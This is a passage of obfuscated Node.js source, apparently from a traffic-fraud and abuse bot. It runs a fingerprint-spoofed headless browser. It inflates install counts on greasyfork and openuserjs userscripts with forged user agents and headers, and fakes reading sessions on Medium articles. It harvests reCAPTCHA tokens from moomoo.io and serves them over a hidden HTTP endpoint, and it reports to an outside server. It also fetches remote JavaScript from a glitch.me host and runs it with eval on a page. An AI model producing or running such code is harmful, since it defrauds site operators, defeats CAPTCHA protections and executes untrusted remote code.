      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + X(0xd) + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + Y(0x13, 'EUFC') + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + X(0x11) + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    Y(0x2, '9eC0') + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + X(0xf),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x26ff + -0xa34 + 0x37 * 0xe5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x26e3 + 0x15ad + 0x1e48 * -0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x53 * 0x5d + 0x6 * 0x359 + 0xa75), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1542 + -0x124c + 0x27f2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xd12 + 0x71 * 0x35 + 0x74b * -0x5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xc34 + 0xbf0 + 0x44; w < getRandomInt(0xe8b + 0xf0d + 0xf * -0x1f9, 0xe53 + -0x15f1 + 0x7a3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xfa11 + -0x6e70 + 0x5ebf);
        }
      }();
    }, -0x1241 + -0x1 * -0x14e + -0xc1 * -0x17), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x293 * 0xd + -0x19e2 + -0x795;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2 * -0x3d9 + -0x231c + -0x27e * -0xb, 0x1 * 0x2203 + 0x1 * 0x14a3 + -0x3674)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1 * -0x8fb5 + -0xb0d4 + 0x964f);
    }, -0x1 * -0x1466 + -0x228e + 0xe8c), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x152 + -0xbe * -0x32 + 0x2 * -0x1337;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xa93 + -0xb50 + -0x4cd * -0x7), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x12e7 + -0x70 * -0x1b + -0x3 * 0xa3d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x3 * -0x22e19 + 0x170f9f + -0x2c9b4);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x42 * 0x35 + -0x3 * 0x5f + 0xb * -0x11b);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x62 * 0x4b + 0x76d + 0x1 * -0x235b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1f * 0xb + -0x3012 + 0x4e4d);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = c,
    a1 = b;
  async function f() {
    const a0 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0x7e6 + -0xb * 0x65 + 0xc3e) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x136 * 0x2 + -0x16c4 + 0x1459));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x17f3 * -0x1 + -0x3 * -0xcca + -0xe6b, D['indexOf']('\x20'));
        return B ? E['slice'](0xbef * -0x1 + -0x1 * 0x1191 + 0x1d80, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1b25 * 0x2 + 0x4acf + -0x5a09),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + a0(0xb) + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3f + -0x31 * -0xa7 + 0x758),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + a1(0x8, '@7FV'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + a1(0xe, 'GdKX') + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + a2(0x6),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      a1(0x10, 'Blf)') + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
